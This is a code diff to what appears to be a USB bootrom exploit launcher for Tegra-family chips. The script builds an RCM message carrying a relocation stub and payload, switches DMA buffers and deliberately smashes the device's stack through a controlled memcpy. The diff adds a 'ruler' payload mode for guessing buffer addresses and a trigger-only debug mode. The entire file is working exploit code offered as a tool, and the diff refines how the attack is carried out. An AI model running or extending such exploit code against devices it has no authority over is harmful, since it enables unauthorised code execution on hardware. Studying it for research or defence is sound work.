@@ -29,11 +29,7 @@
 
 import os
 import sys
-import errno
-import ctypes
 import argparse
-import platform
-import usb
 
 from SoC import *
 
@@ -55,20 +51,13 @@ parser.add_argument('--allow-failed-id', dest='permissive_id', action='store_tru
 parser.add_argument('--tty', dest='tty_mode', action='store_true', help="dump usb transfers to stdout")
 parser.add_argument('-o', metavar='output_file', dest='output_file', type=str, help='dump usb transfers to file')
 parser.add_argument('--debug', dest='debug', action='store_true', help="enable additional debug output")
+parser.add_argument('--ruler', dest='ruler', type=int, help="generate payload with uint32 incrementing load, useful to guess buffer address")
+parser.add_argument('--debug_trigger', dest='debug_trigger', type=int, help="just send exploit package without payload")
 
 arguments = parser.parse_args()
 
-# Expand out the payload path to handle any user-refrences.
-payload_path = os.path.expanduser(arguments.payload)
-if not os.path.isfile(payload_path):
-    print("Invalid payload path specified!")
-    sys.exit(-1)
-
 # Find our intermezzo relocator...
 intermezzo_path = os.path.expanduser(arguments.relocator)
-if not os.path.isfile(intermezzo_path):
-    print("Could not find the intermezzo interposer. Did you build it?")
-    sys.exit(-1)
 
 # Automatically choose the correct SoC based on the USB product ID.
 rcm_device = detect_device(wait_for_device=arguments.wait, os_override=arguments.platform, vid=arguments.vid, pid=arguments.pid, override_checks=arguments.skip_checks, debug=arguments.debug)
@@ -88,22 +77,31 @@ except OSError as e:
     if not arguments.permissive_id:
         raise e
 
-# Construct the RCM message which contains the data needed for the exploit.
-rcm_message = rcm_device.create_rcm_message(intermezzo_path, payload_path)
+if not arguments.debug_trigger:
+    # Construct the RCM message which contains the data needed for the exploit.
+    if arguments.ruler:
+        rcm_message = rcm_device.create_rcm_message_ruler(arguments.ruler)
+    else:
+        # Expand out the payload path to handle any user-refrences.
+        payload_path = os.path.expanduser(arguments.payload)
+        if not os.path.isfile(payload_path):
+            print("Invalid payload path specified!")
+            sys.exit(-1)
+        rcm_message = rcm_device.create_rcm_message(intermezzo_path, payload_path)
 
-# Send the constructed payload, which contains the command, the stack smashing
-# values, the Intermezzo relocation stub, and the final payload.
-print("Uploading payload...")
-rcm_device.write(rcm_message)
+    # Send the constructed payload, which contains the command, the stack smashing
+    # values, the Intermezzo relocation stub, and the final payload.
+    print("Uploading payload...")
+    rcm_device.write(rcm_message)
 
-# The RCM backend alternates between two different DMA buffers. Ensure we're
-# about to DMA into the higher one, so we have less to copy during our attack.
-rcm_device.switch_to_highbuf()
+    # The RCM backend alternates between two different DMA buffers. Ensure we're
+    # about to DMA into the higher one, so we have less to copy during our attack.
+    rcm_device.switch_to_highbuf()
 
 # Smash the device's stack, triggering the vulnerability.
 print("Smashing the stack...")
 try:
-    rcm_device.trigger_controlled_memcpy()
+    rcm_device.trigger_controlled_memcpy(arguments.debug_trigger)
 except ValueError as e:
     print(str(e))
 except IOError:
